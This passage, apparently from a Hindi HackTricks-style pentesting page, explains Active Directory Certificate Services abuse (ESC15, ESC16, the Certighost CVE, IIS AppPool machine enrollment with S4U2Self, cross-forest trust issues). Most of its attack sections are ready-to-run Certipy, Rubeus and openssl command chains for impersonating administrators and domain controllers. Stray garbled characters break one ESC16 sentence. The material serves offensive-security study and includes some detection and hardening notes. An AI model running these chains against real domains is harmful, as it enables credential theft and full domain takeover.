 प्रमाणपत्र का उपयोग करके प्रमाणित करें

```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```

सफाई (वैकल्पिक)

```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```

विभिन्न attack scenarios में अधिक विशिष्ट attack methods के लिए, कृपया निम्नलिखित देखें: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0)।<sup>[[13]](#references)</sup>

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### व्याख्या

[मूल ESC15 शोध](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc) बताता है कि V1 template के लिए किए गए अनुरोध में दी गई application policies, **unpatched issuing CA** पर कॉन्फ़िगर किए गए Extended Key Usage को कैसे override कर सकती हैं।<sup>[[15]](#references)</sup> संभावित target के पास एक प्रकाशित, enrollable template भी होना चाहिए, जो आवश्यक subject/request properties की अनुमति देता हो और जिस पर कोई blocking approval या signature gate न हो। केवल enrollment rights से exploitation साबित नहीं होता। Certificate Request Agent का उपयोग किसी उपयुक्त दूसरे template और enrollment-agent restrictions पर भी निर्भर हो सकता है; इस path का दावा करने से पहले CA का patch state और issuance result सत्यापित करें।

### दुरुपयोग

[Certipy privilege-escalation documentation](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) में उपयोग के अधिक विस्तृत उदाहरण दिए गए हैं।<sup>[[14]](#references)</sup>


यदि CA unpatched है, तो Certipy का `find` command उन V1 templates की पहचान करने में मदद कर सकता है जो संभावित रूप से ESC15 के प्रति संवेदनशील हैं।

```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```

#### परिदृश्य A: Schannel के ज़रिए सीधा प्रतिरूपण

**चरण 1: "Client Authentication" Application Policy और target UPN inject करके certificate का अनुरोध करें।** Attacker `attacker@corp.local`, "WebServer" V1 template का उपयोग करके `administrator@corp.local` को target करता है (जो enrollee-supplied subject की अनुमति देता है)।

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'WebServer' \
    -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
    -application-policies 'Client Authentication'
```

- `-template 'WebServer'`: "Enrollee supplies subject" वाला vulnerable V1 template।
- `-application-policies 'Client Authentication'`: CSR के Application Policies extension में OID `1.3.6.1.5.5.7.3.2` inject करता है।
- `-upn 'administrator@corp.local'`: impersonation के लिए SAN में UPN सेट करता है।

**Step 2: प्राप्त certificate का उपयोग करके Schannel (LDAPS) के ज़रिए authenticate करें।**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```

#### परिदृश्य B: Enrollment Agent Abuse के ज़रिए PKINIT/Kerberos Impersonation

**चरण 1: "Enrollee supplies subject" वाले V1 template से certificate का अनुरोध करें और उसमें "Certificate Request Agent" Application Policy डालें।** यह certificate हमलावर (`attacker@corp.local`) को enrollment agent बनने के लिए है। यहाँ हमलावर की अपनी पहचान के लिए कोई UPN निर्दिष्ट नहीं किया जाता, क्योंकि उद्देश्य agent की क्षमता प्राप्त करना है।

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'WebServer' \
    -application-policies 'Certificate Request Agent'
```

- `-application-policies 'Certificate Request Agent'`: OID `1.3.6.1.4.1.311.20.2.1` inject करता है।

**Step 2: "agent" certificate का उपयोग करके किसी target privileged user की ओर से certificate का अनुरोध करें।** यह ESC3-जैसा step है, जिसमें Step 1 के certificate को agent certificate के रूप में उपयोग किया जाता है।

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'User' \
    -pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```

**चरण 3: "on-behalf-of" certificate का उपयोग करके privileged user के रूप में authenticate करें।**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```

## CA पर Security Extension अक्षम (वैश्विक रूप से)-ESC16

### व्याख्या

**ESC16 (szOID_NTDS_CA_SECURITY_EXT Extension की अनुपस्थिति के ज़रिए Privilege Escalation)**, CA-व्यापी स्तर पर **szOID_NTDS_CA_SECURITY_EXT** SID extension को दबाने को दर्शाता है। यह configuration का एक संकेतक है, इस बात का प्रमाण नहीं कि कोई certificate किसी अन्य account के रूप में authenticate कर सकता है। Impersonation के लिए संबंधित account attributes या mapping पर नियंत्रण, enroll किया जा सकने वाला client-authentication template, और actual domain controller या service द्वारा स्वीकार किया जाने वाला certificate mapping path भी आवश्यक है। Full Enforcement में patched KDC, SID extension के बिना certificates को अस्वीकार करता है, जब तक कि उनके पास कोई अन्य strong mapping न हो; नीचे दी गई UPN-only Kerberos प्रक्रिया पुराने या compatibility-mode KDCs पर लागू होती है, जो अब भी weak mapping स्वीकार करते हैं। [Microsoft की certificate mapping और enforcement संबंधी guidance](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers) देखें।

विस्तृत सिद्धांत के बारे में अधिक जानने के लिए आप इस लेख का भी संदर्भ ले सकते हैं:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### दुरुपयोग

UPN-only Kerberos का निम्नलिखित ऐतिहासिक उदाहरण [Certipy के ESC16 दस्तावेज़](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally) पर आधारित है। इसके लिए ऐसे KDC की आवश्यकता है जो परिणामी weak mapping को अब भी स्वीकार करता हो; 9 सितंबर, 2025 के Windows security update के बाद `StrongCertificateBindingEnforcement=1` समर्थित override नहीं रहा।<sup>[[14]](#references)</sup>

यह पहचानने के लिए कि Active Directory Certificate Services (AD CS) environment **ESC16** के प्रति vulnerable है या नहीं】【。

```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```

**चरण 1: पीड़ित खाते का प्रारंभिक UPN पढ़ें (वैकल्पिक - पुनर्स्थापना के लिए)।  


```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -user 'victim' \
    read
```

**चरण 2: पीड़ित खाते के UPN को लक्षित एडमिनिस्ट्रेटर के `sAMAccountName` में अपडेट करें।  

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -upn 'administrator' \
    -user 'victim' update
```

**चरण 3: (यदि आवश्यक हो) "victim" अकाउंट के क्रेडेंशियल प्राप्त करें (उदा., Shadow Credentials के ज़रिए)।**

```shell
certipy shadow \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -account 'victim' \
    auto
```

**चरण 4: ESC16-configured CA पर उस client-authentication template (जैसे, "User") से "victim" user के रूप में certificate का अनुरोध करें, जिसमें account enroll कर सकता है।** CA जारी किए गए certificate से SID security extension हटा देता है, लेकिन इससे अपने आप उपयोगी authentication mapping स्थापित नहीं होती। Kerberos credential cache environment variable सेट करें (shell command):

```bash
export KRB5CCNAME=victim.ccache
```

इसके बाद प्रमाणपत्र का अनुरोध करें:

```bash
certipy req \
    -k -dc-ip '10.0.0.100' \
    -target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
    -template 'User'
```

**चरण 5: "victim" account का UPN पहले जैसा करें।**

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -upn 'victim@corp.local' \
    -user 'victim' update
```

**चरण 6: ऐसे पुराने या compatibility-mode KDC पर, जो इस कमज़ोर mapping को स्वीकार करता है, target administrator के रूप में authenticate करें।**

```bash
certipy auth \
    -dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
    -username 'administrator' -domain 'corp.local'
```

## Rogue LDAP/LSA chase callback identity substitution (Certighost / CVE-2026-54121)

### विवरण

**Certighost**, **AD CS enrollment chase / callback path** का दुरुपयोग करता है, जिसमें CA, जारी किए जाने वाले certificate में रखी जाने वाली identity को resolve करने के लिए requester द्वारा दिए गए request attributes पर भरोसा करता है। सार्वजनिक PoC में crafted request में ये शामिल होते हैं:<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`**: attacker द्वारा नियंत्रित host/IP, जिससे CA संपर्क करेगा
- **`rmd`**: impersonate किए जाने वाले **target Domain Controller का DNS name**

यदि CA इस chase का अनुसरण करता है, तो वह **SMB/LSA (`445`)** और **LDAP (`389`)** के ज़रिए attacker से connect करेगा। Attacker एक **वास्तविक machine account** का उपयोग करता है (आमतौर पर default **`ms-DS-MachineAccountQuota`** के ज़रिए बनाया गया), ताकि callback session एक valid domain principal के रूप में authenticate हो। लेकिन rogue services इसके बजाय **target DC** के identity attributes लौटाती हैं:

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

यदि CA **लौटाई गई identity को authenticated callback principal से cryptographically bind नहीं करता**, तो session के attacker-नियंत्रित machine account के रूप में authenticate होने के बावजूद वह **Domain Controller** के लिए certificate जारी कर सकता है। इस कारण यह bug, अवधारणात्मक रूप से **Certifried** से अलग है: AD attributes जैसे `dNSHostName` को rewrite करने के बजाय, attacker **CA callback resolution के दौरान identity data को substitute करता है**।<sup>[[2]](#references)</sup>

**ज़रूरी पूर्वशर्तें:**

- कम privileges वाले **domain credentials**
- **computer account बनाने या दोबारा उपयोग करने** की क्षमता
- **CA** से attacker-नियंत्रित **ports `389` और `445`** तक network reachability
- Vulnerable / unpatched CA request path (**July 14, 2026** के Microsoft update में **`cdc` के लिए DC validation** और **resolved-SID comparison** जोड़ा गया)

इसके बाद मिले **`.pfx`** का उपयोग **PKINIT** के लिए किया जा सकता है, जिससे **`.ccache`** और प्रकाशित PoC flow में **target DC का NT hash** प्राप्त होता है। यह आमतौर पर **पूरे domain पर नियंत्रण पाने** के लिए पर्याप्त है।

### दुरुपयोग

सार्वजनिक PoC पूरी chain को automate करता है:<sup>[[1]](#references)</sup>

1. Attacker-नियंत्रित **machine account** बनाएँ या दोबारा उपयोग करें।
2. `389` और `445` पर **rogue LDAP और SMB/LSA listeners** शुरू करें।
3. Attacker-नियंत्रित **`cdc`** और target **`rmd`** attributes वाला certificate request submit करें।
4. CA को controlled machine account के रूप में rogue listeners से authenticate करने दें, लेकिन identity lookups के जवाब में **target DC** के attributes लौटाएँ।
5. CA द्वारा signed **DC certificate** प्राप्त करें, फिर उसका उपयोग **PKINIT** के लिए करें।

```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```

PoC से मिलने वाले उपयोगी runtime flags:

- `--listener <ip>`: `cdc` में विज्ञापित callback IP स्पष्ट रूप से चुनें
- `--computer-name <NAME$>`: नया machine account बनाने के बजाय मौजूदा machine account का पुनः उपयोग करें

**ऑपरेशनल नोट्स:**

- PoC को **root** की आवश्यकता है, क्योंकि यह **privileged ports** `389` और `445` पर bind करता है।
- सफल exploitation स्थानीय रूप से एक **DC `.pfx`** और **Kerberos `.ccache`** लिखता है।
- क्योंकि certificate एक **Domain Controller account** से map होता है, आगे की कार्रवाइयों में **certificate-based Kerberos auth**, **DCSync**, और प्राप्त **machine NT hash** का पुनः उपयोग शामिल हो सकता है।<sup>[[2]](#references)</sup>

## IIS AppPool मशीन enrollment से same-host Administrator तक

`ApplicationPoolIdentity` के रूप में चलने वाला IIS pool, network resources तक outbound access के लिए अपने host के **computer account** का उपयोग करता है। इसलिए, `IIS AppPool\<POOL>` के रूप में code execution स्थानीय token में low-privileged रहता है, लेकिन एक AD CS request सबमिट कर सकता है, जिसे CA `HOST$` के रूप में authenticate करता है; यह outbound identity transition है, token impersonation या Potato-style local elevation नहीं।<sup>[[19]](#references)[[20]](#references)</sup>

इस chain के लिए domain-joined IIS host, RPC के ज़रिए पहुंच योग्य Enterprise CA, ऐसा published machine-authentication template जिसके लिए computer के पास enrollment rights हों, PKINIT support, और KDC/SMB तक पहुंच आवश्यक है। Custom pool identity outbound principal को बदल देती है, इसलिए `HOST$` मानने से पहले पुष्टि करें कि pool वास्तव में `ApplicationPoolIdentity` का उपयोग करता है।<sup>[[19]](#references)[[20]](#references)</sup>

### Attacker-controlled-key enrollment

Key pair और CSR, IIS server से अलग बनाएं और private key अपने पास रखें। Compromised worker से **केवल CSR** सबमिट करें। [Certi-Bhai ASPX PoC](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx), `CertificateAuthority.Request` को instantiate करता है, `CertificateTemplate:Machine` सेट करता है, `ICertRequest::Submit` कॉल करता है, और जारी किया गया certificate लौटाता है। CA configuration string `CAHOST\CA-NAME` का उपयोग करें; सामान्य `Machine` template, AD से subject बनाता है, इसलिए requester द्वारा दिए गए subject/SAN data की आवश्यकता नहीं होती।<sup>[[18]](#references)[[19]](#references)[[21]](#references)</sup>

लौटाए गए certificate को **मेल खाती अपने पास रखी key** के साथ जोड़ें। `certutil -MergePFX machine_cert.cer machine_cert.pfx` केवल तभी काम करता है जब Windows पहले से certificate को किसी सुलभ private key से जोड़ सकता हो; अलग PEM files के लिए, स्पष्ट रूप से PKCS#12 बनाएं:<sup>[[19]](#references)[[23]](#references)</sup>

```bash
openssl pkcs12 -export -in machine_cert.cer -inkey machine_cert.key \
  -out machine_cert.pfx -name 'HOST$'
```

PKINIT के लिए PFX का उपयोग करें और लौटाए गए कंप्यूटर TGT को तुरंत inject करने के बजाय base64 के रूप में रखें:<sup>[[5]](#references)[[19]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:HOST$ /domain:DOMAIN /certificate:machine_cert.pfx `
  /password:PFX_PASSWORD /nowrap
```

### S4U2Self और same-host service substitution

S4U2Self किसी service को **खुद के लिए** ऐसा ticket लेने देता है जिसमें किसी अन्य user का authorization data होता है। Computer TGT के साथ, Rubeus किसी privileged user के लिए वह ticket request कर सकता है, लौटाए गए KRB-CRED में service name को CIFS से बदल सकता है और उसे inject कर सकता है। यह local “delegate to thyself” primitive है: इसके लिए S4U2Proxy या `msDS-AllowedToDelegateTo` entry की ज़रूरत नहीं होती।<sup>[[5]](#references)[[17]](#references)[[22]](#references)</sup>

```powershell
Rubeus.exe s4u /self /impersonateuser:Administrator `
  /altservice:cifs/HOST.DOMAIN /ticket:BASE64_MACHINE_TGT /ptt /nowrap

klist
dir \\HOST.DOMAIN\C$
```

प्रतिस्थापित ticket का उपयोग केवल **उसी computer account/key** की services कर सकती हैं (यहाँ, `HOST` पर CIFS)। यह अन्य domain machines के लिए दोबारा इस्तेमाल किया जा सकने वाला Administrator ticket नहीं है। साथ ही, यहाँ दिखाया गया परिणाम Administrator के रूप में privileged SMB/filesystem access है; स्थानीय `NT AUTHORITY\SYSTEM` process प्राप्त करने के लिए अब भी एक अलग remote-execution चरण आवश्यक है।<sup>[[5]](#references)[[17]](#references)[[19]](#references)</sup>

### Detection और hardening

- CA पर, IIS server accounts द्वारा किए गए अप्रत्याशित `Machine`-template requests के लिए Certification Services events **4886** (request प्राप्त हुआ) और **4887** (जारी किया गया) का सहसंबंध करें।<sup>[[19]](#references)[[24]](#references)</sup>
- DCs पर, certificate pre-authentication के उपयोग पर event **4768** में certificate fields शामिल होते हैं; web-server accounts के लिए असामान्य PKINIT TGT requests पर alert करें। इसके बाद, privileged impersonated identity और उसी host से जुड़े **4769** requests देखें। चूँकि Rubeus `/altservice` client-side पर KRB-CRED service name को rewrite करता है, इसलिए DC-side 4769 service name का `cifs` होना आवश्यक न मानें।<sup>[[5]](#references)[[25]](#references)[[26]](#references)</sup>
- `w3wp.exe` द्वारा CA RPC endpoints तक पहुँचने, अप्रत्याशित ASPX creation, Kerberos-authenticated administrative shares तक पहुँच और secrets-dumping activity की तलाश करें। जहाँ संभव हो, app-tier की CA RPC/KDC/SMB तक पहुँच सीमित करें और computer enrollment rights या ऐसे machine-authentication templates हटाएँ जिनकी operational आवश्यकता नहीं है।<sup>[[19]](#references)</sup>

## Passive Voice में समझाया गया Certificates के ज़रिए Forests का Compromising

### Compromised CAs द्वारा Forest Trusts का टूटना

**Cross-forest enrollment** के configuration को अपेक्षाकृत सरल बनाया गया है। Resource forest का **root CA certificate** administrators द्वारा **account forests में प्रकाशित** किया जाता है, और resource forest के **enterprise CA certificates को हर account forest के `NTAuthCertificates` और AIA containers में जोड़ा** जाता है। स्पष्ट रूप से कहें तो, यह व्यवस्था resource forest के **CA को उन सभी अन्य forests पर पूरा नियंत्रण देती है** जिनके PKI का प्रबंधन वह करता है। यदि इस CA को **attackers द्वारा compromise कर लिया जाए**, तो resource और account forests—दोनों के सभी users के certificates **उनके द्वारा forge किए जा सकते हैं**, जिससे forest की security boundary टूट जाती है।<sup>[[6]](#references)</sup>

### Foreign Principals को दिए गए Enrollment Privileges

Multi-forest environments में, ऐसे Enterprise CAs के संबंध में सावधानी आवश्यक है जो certificate templates **publish करते हैं** और **Authenticated Users या foreign principals** (अर्थात Enterprise CA वाले forest से बाहर के users/groups) को **enrollment और edit rights देते हैं**।\
किसी trust के पार authentication होने पर, AD द्वारा **Authenticated Users SID** को user के token में जोड़ा जाता है। इसलिए, यदि किसी domain के पास ऐसा template वाला Enterprise CA है जो **Authenticated Users को enrollment rights देता है**, तो किसी दूसरे forest का user उस template में **enroll कर सकता है**। इसी तरह, यदि किसी template द्वारा **किसी foreign principal को स्पष्ट रूप से enrollment rights दिए गए हों**, तो इससे **cross-forest access-control relationship बनता है**, जो एक forest के principal को दूसरे forest के template में **enroll करने में सक्षम बनाता है**।

दोनों स्थितियों से एक forest से दूसरे forest तक **attack surface बढ़ जाता है**। Certificate template की settings का attacker द्वारा शोषण करके foreign domain में अतिरिक्त privileges प्राप्त किए जा सकते हैं।<sup>[[6]](#references)</sup>


## References

- [1] [aniqfakhrul/CVE-2026-54121 PoC repository](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n - Certighost का तकनीकी विश्लेषण](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 – SpecterOps ब्लॉग](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps – Certified Pre-Owned: Active Directory Certificate Services का दुरुपयोग](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak – Certipy 4.0: ESC9, ESC10, BloodHound GUI, नए Authentication और Request Methods तथा अन्य](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps – Shadow Credentials: Account Takeover के लिए Key Trust Account Mapping का दुरुपयोग](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy – Enhanced Key Usage की कहानी](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security – RPC के ज़रिए AD Certificate Services तक Relaying](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo – ESC12: YubiHSM के साथ ADCS CA तक Shell access](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps – ADCS ESC13 Abuse Technique](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps – ADCS ESC14 Abuse Technique](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Certipy Wiki – Privilege Escalation (ESC1-ESC17)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec – EKUwu: AD CS का एक और ESC ही नहीं](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 – AD CS ESC16: Misconfiguration और Exploitation](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)
- [17] [Charlie Clark – “Delegate 2 Thyself” पर फिर से विचार](https://exploit.ph/revisiting-delegate-2-thyself.html)
- [18] [incredibleindishell/Certi-Bhai – IIS AD CS enrollment PoC](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx)
- [19] [Mannu Linux – AD CS RPC Endpoint के ज़रिए IIS AppPool से Privilege Escalation](https://mannulinux.org/2026/08/Privilege-escalation-from-IIS-AppPool-to-NT-AuthoritySYSTEM-via-AD-CS-RPC-endpoint.html)
- [20] [Microsoft – Application Pool Identities](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)
- [21] [Microsoft – ICertRequest::Submit](https://learn.microsoft.com/en-us/windows/win32/api/certcli/nf-certcli-icertrequest-submit)
- [22] [Microsoft Open Specifications – S4U2self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13)
- [23] [OpenSSL – pkcs12 command](https://docs.openssl.org/3.6/man1/openssl-pkcs12/)
- [24] [Microsoft – Certification Services का Audit](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/audit-certification-services)
- [25] [Microsoft – Event 4768: Kerberos authentication ticket का अनुरोध किया गया](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [26] [Microsoft – Event 4769: Kerberos service ticket का अनुरोध किया गया](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
- [27] [incredibleindishell/Certi-Bhai – AD CS PowerShell exploitation toolkit](https://github.com/incredibleindishell/Certi-Bhai)
{{#include ../../../banners/hacktricks-training.md}}
